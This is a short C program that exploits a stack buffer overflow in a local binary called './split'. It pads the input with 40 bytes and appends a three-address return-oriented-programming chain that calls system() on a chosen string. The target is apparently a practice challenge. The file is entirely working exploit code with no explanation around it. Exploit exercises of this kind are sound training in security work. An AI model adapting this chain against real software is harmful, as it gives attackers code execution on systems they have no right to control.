#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

int main(void) {

    int offset = 40;

    // addresses used for the ROP chain
    uintptr_t gadget_addr = 0x4007c3;
    uintptr_t str_addr = 0x601060;
    uintptr_t system_addr = 0x40074b;

    int addr_size = sizeof(uintptr_t);

    char payload[offset + 3 * addr_size];

    // pad to the offset
    memset(payload, 'A', offset);

    // copy the ROP chain into the payload
    memcpy(payload + offset, &gadget_addr, addr_size);
    memcpy(payload + offset + addr_size, &str_addr, addr_size);
    memcpy(payload + offset + 2 * addr_size, &system_addr, addr_size);

    // open pipes for writing to "split" while its running
    FILE *split_w_pipe = popen("./split", "w");

    if (split_w_pipe == NULL) {
        perror("popen");
        exit(1);
    }

    // write the payload to the pipe and send it to "split"
    fwrite(payload, 1, sizeof(payload), split_w_pipe);
    fflush(split_w_pipe);

    pclose(split_w_pipe);

    return 0;
}